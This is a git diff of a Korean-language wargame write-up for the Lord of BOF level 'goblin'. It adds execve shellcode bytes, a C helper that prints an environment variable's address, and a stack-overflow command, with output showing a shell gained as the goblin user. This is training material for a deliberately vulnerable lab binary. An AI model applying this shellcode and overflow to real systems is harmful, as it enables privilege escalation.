@@ -3,8 +3,7 @@ title: "[LOB]Level03. goblin"
 tags: [LOB, writeup]
 author: eli_ez3r
 key: 20180828
-modify_date: 2019-10-07
-mathjax: false
+modify_date: 2024-04-24
 article_header:
   type: cover
   image:
@@ -52,22 +51,39 @@ buffer배열의 크기가 16Byte로 Shellcode보다 크기가 작으므로 환�
 shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
 ```
 
-
-
 <img src="http://eliez3r.synology.me/assets/img/writeup/lob/03.goblin/image-20180828135809460.png" width="800px">{:.rounded.shadow}
 
-EUNICE 환경변수에 Shellcode를 넣는다.
+`shellcode` 환경변수에 Shellcode를 넣는다.
+
+<br>
 
 ```c
 //env.c
 main(){
-    printf("%08x\n", getenv("EUNICE") );
+    printf("0x%08x\n", getenv("shellcode") );
 }
 ```
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/03.goblin/image-20180828135852712.png" width="400px">{:.rounded.shadow}
+```shell
+[cobolt@localhost cobolt]$ gcc -o env env.c
+[cobolt@localhost cobolt]$ ./env
+0xbfffff3b
+```
 
-EUNICE 환경변수의 주소를 구하는 프로그램을 만들어 EUNICE환경변수의 주소를 구해온다. (0xbffffc33)
+`shellcode` 환경변수의 주소를 구하는 프로그램을 만들어 주소를 구해온다. (0xbfffff3b)
+
+**[!] gdb에서 run 명령 시 user input 주는 방법 1**  
+1) 입력하고나 하는 문자열을 파일로 생성  
+$ python -c 'print "A"*10>tmp  
+1) gdb에서 run 명령어 실행 시 파일 내용 입력   
+(gdb) r<tmp   
+{:.info}
+
+**[!] gdb에서 run 명령 시 user input 주는 방법 2**   
+1) 스크립트 실행 결과를 임시파일 생성 후 바로 임시파일의 내용 입력  
+(gdb) r \`python -c 'print "A"*10'>tmp\`<tmp
+{:.info}
+
 
 -----
 
@@ -81,25 +97,17 @@ EUNICE 환경변수의 주소를 구하는 프로그램을 만들어 EUNICE환�
 
 표준입력으로 넘겨주어야 하기 때문에 `cat` 와 `;`명령어를 함께 사용해야 한다. (FTZ 12번 문제를 풀었다면 쉽게 이해할 수 있을 것이다.)
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/03.goblin/image-20180828135928174.png" width="700px">{:.rounded.shadow}
+```shell
+[cobolt@localhost cobolt]$ (python -c 'print "A"*20+"\x3b\xff\xff\xbf"';cat)|./goblin
+AAAAAAAAAAAAAAAAAAAA;���
+id
+uid=502(cobolt) gid=502(cobolt) euid=503(goblin) egid=503(goblin) groups=502(cobolt)
+my-pass
+euid = 503
+hackers proof
+```
 
 > Cobolt문제와 풀이방법이 동일하므로 상세설명은 생략했다.
-
-<br>
-
-**[!] gdb에서 run 명령 시 user input 주는 방법 1**  
-1) 입력하고나 하는 문자열을 파일로 생성  
-$ python -c 'print "A"*10>tmp  
-2) gdb에서 run 명령어 실행 시 파일 내용 입력   
-(gdb) r<tmp   
-{:.info}
-
-**[!] gdb에서 run 명령 시 user input 주는 방법 2**   
-1) 스크립트 실행 결과를 임시파일 생성 후 바로 임시파일의 내용 입력  
-(gdb) r \`python -c 'print "A"*10'>tmp\`<tmp
-{:.info}
-
-\`python\`
 
 -----
 
